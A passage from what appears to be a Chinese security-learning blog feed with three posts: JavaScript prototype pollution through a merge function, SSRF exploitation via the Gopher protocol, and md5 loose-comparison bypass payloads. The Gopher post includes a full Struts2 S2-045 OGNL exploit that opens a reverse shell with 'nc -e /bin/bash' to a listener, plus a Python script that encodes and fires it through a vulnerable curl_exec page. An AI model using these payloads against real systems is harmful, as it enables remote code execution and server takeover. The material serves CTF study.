class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先引入一些概念方便理解以下的讲解</p><p><strong><strong>proto</strong><strong>是任何一个</strong>对象</strong>拥有的属性</p><p><strong>prototype</strong>是任何一个<strong>函数</strong>拥有的一个属性</p><p>那么对于Function自己这个对象，他是怎么来的呢？如果用<strong>Function.<strong>proto</strong><strong>和</strong>Function.prototype</strong>进行比较，发现<strong>二者是全等</strong>的，所以Function创造了自己，也创造了Object，所以JavaScript中，<strong>所有函数都是对象，而对象是通过函数创建的</strong>。因此</p><p><strong>构造函数.prototype.__proto__应该是Object.prototype，而不是Function.prototype，Function的作用是创建而不是继承。</strong></p><p><strong>eg;</strong></p><p><strong>person=….</strong></p><p>这个person对象就拥有了<strong>person.<strong>proto</strong><strong>这个属性，而Object()我们刚才提到了是由Function创建来的一个构造函数，那么Object就天生有了</strong>Object.prototype。</strong></p><p>为什么要说这些呢就是为了说明白</p><p>1.某一对象的__proto__指向它的prototype（原型对象）， 也就是说如果</p><p><strong>直接访问person.<strong>proto</strong> 那么就相当于访问了Object.prototype。</strong></p><p>2.JavaScript使用prototype链实现继承机制。</p><p>3.构造函数xxx.prototype是一个对象，xxx.prototype也有自己的__proto__属性，并且可以继续指向它的的prototype。</p><p>4.Object.prototype.proto最终指向null，这也是所有原型链的终点。</p><p>5.从一个对象的__proto__不断向上指向原型对象，最终指向Objecct.prototype后，接着指向为Null，这一条链子就叫做原型链。</p><h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a><strong>例子</strong></h6><p>这么长的文章也是讲的略显抽象，我们来个例子便于理解</p><pre class="line-numbers language-language-python"><code class="language-language-python">function Father() {    this.first_name = 'Donald'    this.last_name = 'Trump'}function Son() {    this.first_name = 'Melania'}Son.prototype = new Father()let son = new Son()console.log(`Name: ${son.first_name} ${son.last_name}`)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上边的例子中（下边语言非正式完全准确，为个人总结便于理解，以待不断改正）</p><p>son.__proto__就指向了Son.prototype</p><p><strong>直接访问对象.<strong>proto</strong> 那么就相当于访问了构造函数.prototype。注意对于第一种的实例方法（没构造函数换句话说构造方法就是Object）会指向Object.prototype</strong></p><p>Son.prototype.__proto__指向father.prototype</p><p><strong>Son.prototype = new Father()+上一条理解</strong></p><p>father.prototype.__proto__指向Object.prototype</p><p><strong>构造函数.prototype.__proto__应该是Object.prototype</strong></p><p>Object.prototype.proto指向null</p><p><strong>Object.prototype.proto最终指向null，这也是所有原型链的终点。</strong></p><p>我们在简单引入一下程序运行过程，以理解原型链污染の原理</p><p>对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li><font style="color:rgb(0, 0, 0);">在对象son中寻找last_name。</font></li><li><font style="color:rgb(0, 0, 0);">如果找不到，则在son.__proto__中寻找last_name。</font></li><li><font style="color:rgb(0, 0, 0);">如果仍然找不到，则继续在son.<strong>proto</strong>.__proto__中寻找last_name。</font></li><li><font style="color:rgb(0, 0, 0);">依次寻找，直到找到null结束。</font></li></ol><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a><strong>原型链污染</strong></h1><p>ok，前置知识基本已经明了，我们直接上例子来理解污染</p><pre class="line-numbers language-language-python"><code class="language-language-python">// 这个对象直接实例化Object()let foo = {bar: 1}// foo.bar 此时为1console.log(foo.bar)// 修改foo的原型（即Object）foo.__proto__.bar = 2// 由于查找顺序的原因，foo.bar仍然是1console.log(foo.bar)// 此时再用Object创建一个空的zoo对象let zoo = {}// 查看zoo.barconsole.log(zoo.bar)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里由于修改了foo.<strong>proto</strong>.bar 也就是修改了Object.bar，因此在后续的实例化对象中，新的对象会继承这一属性 造成了原型链污染。</p><p>但是上边很显然是我们自己的实验过程，在ctf中什么情况可以使用呢</p><p>和python原型链污染类似，有合并函数对象merge，对象clone（其实内核就是将待操作的对象merge到一个空对象中），再举一个伪ctf的例子</p><p>eg：</p><pre class="line-numbers language-language-python"><code class="language-language-python">function merge(target, source) {    for (let key in source) {        if (key in source && key in target) {              // 如果target与source有相同的键名 则让target的键值为source的键值            merge(target[key], source[key])        } else {            target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值        }    }}let o1 = {}let o2 = {a: 1, "__proto__": {b: 2}}merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)//1 2//undefined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font style="color:rgb(43, 144, 91);">// 如果target与source没有相通的键名 则直接在target新建键名并赋给键值</font></p><p>这里的__proto__被当作普通建值处理了，merge(o1, o2) 的执行相当于再o1新建merge(o1, o2) 的执行相当于也就是o1变成了**{a: 1, “<strong>proto</strong>“: {b: 2}}**</p><p>原型对象Object并没有被更改</p><p>我么稍作更改把o2以json格式传递来确保__proto__不被当做普通键值</p><pre class="line-numbers language-language-python"><code class="language-language-python">let o1 = {}let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)//1 2//2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font style="color:rgb(43, 144, 91);">// 如果target与source有相同的键名 则让target的键值为source的键值 merge(target[key], source[key])</font></p><p>这里等于 merge(Object.prototype, b: 2)，把<strong>所有对象的原型都污染了，<strong>o1变成了</strong>{a:1,b: 2}</strong></p><h1 id="深入理解-JavaScript-Prototype-污染攻击"><a href="#深入理解-JavaScript-Prototype-污染攻击" class="headerlink" title="深入理解 JavaScript Prototype 污染攻击"></a><strong>深入理解 JavaScript Prototype 污染攻击</strong></h1><p>以上内容过于复杂繁琐，我这里引用一下p神及其简洁的总结</p><ol><li><font style="color:rgb(0, 0, 0);">每个构造函数(constructor)都有一个原型对象(prototype)</font></li><li><font style="color:rgb(0, 0, 0);">对象的__proto__属性，指向类的原型对象prototype</font></li><li><font style="color:rgb(0, 0, 0);">JavaScript使用prototype链实现继承机制</font></li></ol>]]></content>
      
      
      <categories>
          
          <category> 原型链污染，nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> nodejs原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gopher协议在SSRF漏洞中的深入研究</title>
      <link href="/2025/04/16/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/"/>
      <url>/2025/04/16/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>一直以来对于Gopher协议我都是懵懵懂懂，趁学习ssrf攻击redis，再深入研究一下</p><h2 id="一、什么是gopher协议？"><a href="#一、什么是gopher协议？" class="headerlink" title="一、什么是gopher协议？"></a><strong>一、什么是gopher协议？</strong></h2><p><strong>定义</strong>：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p><strong>限制</strong>：gopher协议在各个编程语言中的使用限制</p><p><img src="/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/1.jpg" alt="1"></p><p>–wite-curlwrappers：运用curl工具打开url流</p><p>curl使用curl –version查看版本以及支持的协议</p><p><strong>Gopher协议格式</strong>：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><p><strong>Gopher发送请求HTTP GET请求：</strong></p><p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p><p>nc启动监听，监听2333端口：nc -lp 2333</p><p>使用curl发送http请求，命令为</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">margine:~ margin$ curl gopher://192.168.228.130:2333/abcd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时nc收到的消息为：bcd</p><p><img src="/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/2.jpg" alt="2"></p><p>可以发现url中的a没有被nc接受到，如果命令变为</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">curl gopher://192.168.228.130:2333/_abcd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时nc收到的消息为：abcd</p><p>所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）</p><p>在gopher协议中发送HTTP的数据，需要以下三步：</p><p>1、构造HTTP数据包</p><p>2、URL编码、替换回车换行为%0d%0a</p><p>3、发送gopher协议</p><p>由于前期学习的不完全，我一直觉得他的url编码很奇怪刚好在这里总结一下坑</p><p>1、问号（?）需要转码为URL编码，也就是%3f</p><p>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</p><p>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p><p>这里放两个例子</p><p>1.get请求</p><p>一个GET型的HTTP包，如下：</p><pre class="line-numbers language-language-http"><code class="language-language-http">GET /ssrf/base/get.php?name=Margin HTTP/1.1 Host: 192.168.228.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>URL编码后为：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">curl gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（当然这里是在虚拟机里进行模拟，ctf当然不是curl）</p><p>2.post请求</p><p>对于post请求，我们需要加上host等必要参数，不然传入的post参数会被当作第二个请求（这里我并没有实验，佬已经做过了Apache日志分析）</p><pre class="line-numbers language-language-http"><code class="language-language-http">POST /ssrf/base/post.php HTTP/1.1host:192.168.228.130Content-Type:application/x-www-form-urlencodedContent-Length:11name=Margin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编码后为</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">curl gopher://192.168.228.130:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、如何使用gopher协议反弹shell？"><a href="#二、如何使用gopher协议反弹shell？" class="headerlink" title="二、如何使用gopher协议反弹shell？"></a><strong>二、如何使用gopher协议反弹shell？</strong></h2><p>今天我们用到的漏洞是</p><p><a href="https://zhida.zhihu.com/search?content_id=113031903&amp;content_type=Article&amp;match_order=1&amp;q=Struts2-045%E6%BC%8F%E6%B4%9E&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDM2NDI2OTksInEiOiJTdHJ1dHMyLTA0Nea8j-a0niIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjExMzAzMTkwMywiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.V-AyJd1bJbobPr4UzzxJPab6LsekjAbRMoIf8YVTxJg&amp;zhida_source=entity">Struts2-045漏洞</a>，相信很多大佬不陌生，以下为S2-045漏洞反弹shell的利用代码，我们在本地机器上执行：</p><p>nc -lp 6666</p><pre class="line-numbers language-language-http"><code class="language-language-http">GET /S2-045/ HTTP/1.1Host: 192.168.228.130Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nc -e /bin/bash 192.168.0.119 6666').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>编码</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">curl gopher://192.168.228.130:8080/_GET%20/S2-045/%20HTTP/1.1%0d%0aHost:192.168.0.119%0d%0aContent-Type:%25%7b%28%23%5f%3d%27%6d%75%6c%74%69%70%61%72%74%2f%66%6f%72%6d%2d%64%61%74%61%27%29%2e%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%63%6d%64%3d%27%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%31%39%32%2e%31%36%38%2e%30%2e%31%31%39%20%36%36%36%36%27%29%2e%28%23%69%73%77%69%6e%3d%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%53%79%73%74%65%6d%40%67%65%74%50%72%6f%70%65%72%74%79%28%27%6f%73%2e%6e%61%6d%65%27%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%63%6f%6e%74%61%69%6e%73%28%27%77%69%6e%27%29%29%29%2e%28%23%63%6d%64%73%3d%28%23%69%73%77%69%6e%3f%7b%27%63%6d%64%2e%65%78%65%27%2c%27%2f%63%27%2c%23%63%6d%64%7d%3a%7b%27%2f%62%69%6e%2f%62%61%73%68%27%2c%27%2d%63%27%2c%23%63%6d%64%7d%29%29%2e%28%23%70%3d%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%23%63%6d%64%73%29%29%2e%28%23%70%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%29%2e%28%23%70%72%6f%63%65%73%73%3d%23%70%2e%73%74%61%72%74%28%29%29%2e%28%23%72%6f%73%3d%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%63%6f%70%79%28%23%70%72%6f%63%65%73%73%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%72%6f%73%29%29%2e%28%23%72%6f%73%2e%66%6c%75%73%68%28%29%29%7d%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一定要注意最后加上%0d%0a</p><p>发送请求即可(很可惜，没有打开8080端口，我没能成功)</p><h2 id="三、在SSRF中如何使用gopher协议反弹shell"><a href="#三、在SSRF中如何使用gopher协议反弹shell" class="headerlink" title="三、在SSRF中如何使用gopher协议反弹shell?"></a><strong>三、在SSRF中如何使用gopher协议反弹shell?</strong></h2><p>我们先准备了一个带有ssrf漏洞的页面，代码如下：</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?php    $url = $_GET['url'];    $curlobj = curl_init($url);    echo curl_exec($curlobj);?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要注意的是，<strong>你的PHP版本必须大于等于5.3</strong>，并且在PHP.ini文件中开启了extension=php_curl.dll</p><p>监听nc -lp 6666</p><p>然后在浏览器中访问：</p><p><a href="http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc">?url=gopher://192.168.0.119:6666/_abc</a></p><p>可以看到nc接收abc到了消息，没有问题。</p><p>1.准备好访问get.php的数据包（<strong>照搬的本文开始的包</strong>）</p><pre><code>gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A</code></pre><p>payload：</p><p>url=gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A</p><p>我们来测试下，结果如下：</p><p><img src="/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/1746790015908.jpg" alt="1746790015908"></p><p>发现并没有出现get页面的hello Margin，说明请求失败，这个地方卡了一会，发现是因为在PHP在接收到参数后会做一次URL的解码，正如我们上图所看到的，%20等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。编码结果如下：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3A%2F%2F192.168.0.109%3A80%2F_GET%2520%2Fssrf%2Fbase%2Fget.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.0.109%250d%250A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时发起请求，得到如下结果：</p><p><img src="D:\HexoBlog\source\Gopher协议在SSRF漏洞中的深入研究\1746789885416-17467900101612.jpg" alt="1746789885416"></p><p>发现已经正常，此时便说明我们的环境没有问题，SSRF漏洞利用正常，开始接下来的步骤。</p><p>2.准备好struts2-045漏洞的利用代码，并进行二次编码，需要注意的是Content-Type中放了主要的漏洞利用代码，并且特殊字符多，将其单独进行编码，步骤如下：</p><p>将gopher协议一直到Content-Type进行二次编码</p><p>将Content-Type的值所有字符进行URL二次编码</p><p>payload</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">gopher%3A%2F%2F192.168.0.119%3A8080%2F_GET%2520%2FS2-045%2F%2520HTTP%2F1.1%250d%250aHost%3A192.168.0.119%250d%250aContent-Type%3A ......... %0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后附上编码脚本（python2.7）：</p><pre class="line-numbers language-language-python"><code class="language-language-python">#!/usr/bin/python# -*- coding: UTF-8 -*-import urllib2,urlliburl = "http://192.168.0.109/ssrf/base/curl_exec.php?url="header = """gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1Host:192.168.0.119Content-Type:"""cmd = "nc -e /bin/bash 192.168.0.109 6666"content_type = """自己填写(不要有换行)"""header_encoder = ""content_type_encoder = ""content_type_encoder_2 = ""url_char = [" "]nr = "\r\n"# 编码请求头for single_char in header:    if single_char in url_char:        header_encoder += urllib.quote(urllib.quote(single_char,'utf-8'),'utf-8')    else:        header_encoder += single_charheader_encoder = header_encoder.replace("\n",urllib.quote(urllib.quote(nr,'utf-8'),'utf-8'))# 编码content-type，第一次编码for single_char in content_type:    # 先转为ASCII,在转十六进制即可变为URL编码    content_type_encoder += str(hex(ord(single_char)))content_type_encoder = content_type_encoder.replace("0x","%") + urllib.quote(nr,'utf-8')# 编码content-type，第二次编码for single_char in content_type_encoder:    # 先转为ASCII,在转十六进制即可变为URL编码    content_type_encoder_2 += str(hex(ord(single_char)))content_type_encoder_2 = content_type_encoder_2.replace("0x","%")exp = url + header_encoder + content_type_encoder_2print exprequest = urllib2.Request(exp)response = urllib2.urlopen(request).read()print response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gopher协议在SSRF漏洞中的深入研究 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5整理</title>
      <link href="/2025/04/16/md5/"/>
      <url>/2025/04/16/md5/</url>
      
        <content type="html"><![CDATA[<p>md5的常规payload整理，如有错误，请佬指出</p><h1 id="一-md5弱比较比较"><a href="#一-md5弱比较比较" class="headerlink" title="一.md5弱比较比较"></a>一.md5弱比较比较</h1><h2 id="1-0e绕过"><a href="#1-0e绕过" class="headerlink" title="1.0e绕过"></a>1.0e绕过</h2><p>部分字符串经过md5加密之后为0exxxx的格式，相当于0的xxxx次方，所以无论xxxx是什么，函数判断时</p><p>会认为相等。</p><p>例如</p><p>a=QNKCDZO,加密后为0e830400451993494058024219903391</p><p>b=240610708,加密后为0e462097431906509019562988736854</p><p>所以既满足了a!=b，也满足了md5($ a) == md5( $b），即可绕过</p><p>这里附上常见的0E开头的MD5<br>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s532378020a<br>0e220463095855511507588041205815<br>s1665632922a<br>0e731198061491163073197128363787<br>s1184209335a<br>0e072485820392773389523109082030<br>s1885207154a<br>0e509367213418206700842008763514<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>详细<br>//数字字母<br>s878926199a 0e545993274517709034328855841020<br>s155964671a 0e342768416822451524974117254469<br>s214587387a 0e848240448830537924465865611904<br>s214587387a 0e848240448830537924465865611904<br>s878926199a 0e545993274517709034328855841020<br>s1091221200a 0e940624217856561557816327384675<br>s1885207154a 0e509367213418206700842008763514<br>s1502113478a 0e861580163291561247404381396064<br>s1885207154a 0e509367213418206700842008763514<br>s1836677006a 0e481036490867661113260034900752<br>s155964671a 0e342768416822451524974117254469<br>s1184209335a 0e072485820392773389523109082030<br>s1665632922a 0e731198061491163073197128363787<br>s1502113478a 0e861580163291561247404381396064<br>s1836677006a 0e481036490867661113260034900752<br>s1091221200a 0e940624217856561557816327384675<br>s155964671a 0e342768416822451524974117254469<br>s1502113478a 0e861580163291561247404381396064<br>s155964671a 0e342768416822451524974117254469<br>s1665632922a 0e731198061491163073197128363787<br>s155964671a 0e342768416822451524974117254469<br>s1091221200a 0e940624217856561557816327384675<br>s1836677006a 0e481036490867661113260034900752<br>s1885207154a 0e509367213418206700842008763514<br>s532378020a 0e220463095855511507588041205815<br>s878926199a 0e545993274517709034328855841020<br>s1091221200a 0e940624217856561557816327384675<br>s214587387a 0e848240448830537924465865611904<br>s1502113478a 0e861580163291561247404381396064<br>s1091221200a 0e940624217856561557816327384675<br>s1665632922a 0e731198061491163073197128363787<br>s1885207154a 0e509367213418206700842008763514<br>s1836677006a 0e481036490867661113260034900752<br>s1665632922a 0e731198061491163073197128363787<br>s878926199a 0e545993274517709034328855841020<br>//数字<br>240610708 0e462097431906509019562988736854<br>314282422 0e990995504821699494520356953734<br>571579406 0e972379832854295224118025748221<br>903251147 0e174510503823932942361353209384<br>1110242161 0e435874558488625891324861198103<br>1320830526 0e912095958985483346995414060832<br>1586264293 0e622743671155995737639662718498<br>2302756269 0e250566888497473798724426794462<br>2427435592 0e067696952328669732475498472343<br>2653531602 0e877487522341544758028810610885<br>3293867441 0e471001201303602543921144570260<br>3295421201 0e703870333002232681239618856220<br>3465814713 0e258631645650999664521705537122<br>3524854780 0e507419062489887827087815735195<br>3908336290 0e807624498959190415881248245271<br>4011627063 0e485805687034439905938362701775<br>4775635065 0e998212089946640967599450361168<br>4790555361 0e643442214660994430134492464512<br>5432453531 0e512318699085881630861890526097<br>5579679820 0e877622011730221803461740184915<br>5585393579 0e664357355382305805992765337023<br>6376552501 0e165886706997482187870215578015<br>7124129977 0e500007361044747804682122060876<br>7197546197 0e915188576072469101457315675502<br>7656486157 0e451569119711843337267091732412<br>//字母<br>QLTHNDT 0e405967825401955372549139051580<br>QNKCDZO 0e830400451993494058024219903391<br>EEIZDOI 0e782601363539291779881938479162<br>TUFEPMC 0e839407194569345277863905212547<br>UTIPEZQ 0e382098788231234954670291303879<br>UYXFLOI 0e552539585246568817348686838809<br>IHKFRNS 0e256160682445802696926137988570<br>PJNPDWY 0e291529052894702774557631701704<br>ABJIHVY 0e755264355178451322893275696586<br>DQWRASX 0e742373665639232907775599582643<br>DYAXWCA 0e424759758842488633464374063001<br>GEGHBXL 0e248776895502908863709684713578<br>GGHMVOE 0e362766013028313274586933780773<br>GZECLQZ 0e537612333747236407713628225676<br>NWWKITQ 0e763082070976038347657360817689<br>NOOPCJF 0e818888003657176127862245791911<br>MAUXXQC 0e478478466848439040434801845361<br>MMHUWUV 0e701732711630150438129209816536 </p><h2 id="2-数组绕过"><a href="#2-数组绕过" class="headerlink" title="2.数组绕过"></a>2.数组绕过</h2><p>a[]=&amp;b[]=2</p><h1 id="二-双重md5下的0e绕过"><a href="#二-双重md5下的0e绕过" class="headerlink" title="二.双重md5下的0e绕过"></a>二.双重md5下的0e绕过</h1><p><strong>7r4lGXCH2Ksu2JNT3BYM</strong></p><p><strong>CbDLytmyGm2xQyaLNhWn</strong></p><p><strong>770hQgrBOjrcqftrlaZk</strong><br>双MD5的：</p><p><strong>V5VDSHva7fjyJoJ33IQl</strong></p><p>md5(“V5VDSHva7fjyJoJ33IQl”) =&gt; 0e18bb6e1d5c2e19b63898aeed6b37ea</p><p>md5(“0e18bb6e1d5c2e19b63898aeed6b37ea”) =&gt; 0e0a710a092113dd5ec9dd47d4d7b86f</p><p><strong>CbDLytmyGm2xQyaLNhWn</strong></p><p>md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18</p><p>md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af</p><p><strong>770hQgrBOjrcqftrlaZk</strong></p><p>md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625</p><p>md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064</p><p><strong>7r4lGXCH2Ksu2JNT3BYM</strong></p><p>md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849</p><p>md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</p><h1 